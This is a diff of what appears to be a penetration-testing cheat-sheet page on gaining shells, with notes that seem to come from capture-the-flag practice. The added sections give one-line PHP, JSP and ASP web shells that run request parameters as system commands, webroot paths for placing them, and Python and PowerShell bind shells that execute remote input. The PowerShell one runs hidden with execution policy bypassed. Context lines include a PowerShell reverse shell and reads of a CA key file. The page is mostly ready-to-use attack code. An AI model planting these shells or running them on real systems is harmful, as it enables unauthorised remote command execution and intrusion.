@@ -28,9 +28,9 @@ rlwrap nc 10.10.10.131 6200
 
 #### <mark style="color:orange;">`BASH`</mark><mark style="color:purple;">:</mark>
 
-1. <mark style="color:purple;">`python3 -c 'import pty; pty.spawn("/bin/bash")'`</mark>
-2. &#x20;<mark style="color:purple;">`CTRL+Z`</mark>
-3. <mark style="color:purple;">`stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;`</mark>
+1. <mark style="color:red;">**`python3 -c 'import pty; pty.spawn("/bin/bash")'`**</mark>
+2. &#x20;<mark style="color:red;">**`CTRL+Z`**</mark>
+3. <mark style="color:red;">**`stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;`**</mark>
 
 <mark style="color:orange;">**`ZSH`**</mark><mark style="color:purple;">:</mark>
 
@@ -177,14 +177,40 @@ file_get_contents("/etc/os-release")
 * <mark style="color:purple;">If there are break line characters like</mark> <mark style="color:orange;">**`/n`**</mark> <mark style="color:purple;">and you want to get ride of then:</mark>
 
 ```php
-echo file_get_contents("/home/nairobi/ca.key")
+echo file_get_contents("home/nairobi/ca.key")
 ```
 {% endhint %}
 
 ***
 
 {% hint style="warning" %}
-## Web Shells
+## <mark style="color:purple;">Web Shells</mark>
+
+### <mark style="color:purple;">Identify the</mark> <mark style="color:orange;">`Webroot`</mark>
+
+{% code title="Apache" %}
+```
+/var/www/html
+```
+{% endcode %}
+
+{% code title="Nginx" %}
+```
+/usr/local/nginx/html/
+```
+{% endcode %}
+
+{% code title="IIS" %}
+```
+c:\inetpub\wwwroot\
+```
+{% endcode %}
+
+{% code title="XAMPP" %}
+```
+C:\xampp\htdocs\
+```
+{% endcode %}
 
 ### <mark style="color:orange;">`PHP`</mark>
 
@@ -197,6 +223,26 @@ echo file_get_contents("/home/nairobi/ca.key")
 {% code title="Create cmd.php" %}
 ```bash
 echo '<?php system($_REQUEST['cmd']); ?>' > cmd.php
+```
+{% endcode %}
+
+***
+
+### <mark style="color:orange;">`JSP (Java Server Pages)`</mark>
+
+{% code title="Standard shell" overflow="wrap" %}
+```java
+<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+```
+{% endcode %}
+
+***
+
+### <mark style="color:orange;">`ASP (Active Server Pages)`</mark>
+
+{% code title="Standar shell" %}
+```aspnet
+<% eval request("cmd") %>
 ```
 {% endcode %}
 {% endhint %}
@@ -297,6 +343,64 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.
 {% endcode %}
 {% endhint %}
 
+***
+
+{% hint style="info" %}
+## <mark style="color:purple;">Bind Shells</mark>
+
+* ### <mark style="color:purple;">First, find ports were</mark> <mark style="color:orange;">**`inbound`**</mark> <mark style="color:purple;">connections are allowed:</mark>
+* ### <mark style="color:orange;">`Linux`</mark><mark style="color:purple;">:</mark>
+
+```sh
+ss -tuln
+```
+
+```bash
+netstat -tuln
+```
+
+```sh
+lsof -i -n
+```
+
+***
+
+* ### <mark style="color:orange;">`Windows`</mark><mark style="color:purple;">:</mark>
+
+```sh
+netstat -ano | findstr "LISTEN"
+```
+
+{% code overflow="wrap" %}
+```powershell
+Get-Process | Where-Object {$_.Id -eq (Get-NetTCPConnection | Where-Object {$_.State -eq 'Listen'}).OwningProcess}
+```
+{% endcode %}
+
+{% code title="Check firewall rules" %}
+```sh
+netsh advfirewall firewall show rule name=all
+```
+{% endcode %}
+
+***
+
+### <mark style="color:purple;">Shells</mark>
+
+{% code overflow="wrap" %}
+```sh
+python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
+```
+{% endcode %}
+
+{% code title="Windows" overflow="wrap" %}
+```powershell
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
+```
+{% endcode %}
+{% endhint %}
+
+\
 Spawning Shells
 
 ```bash
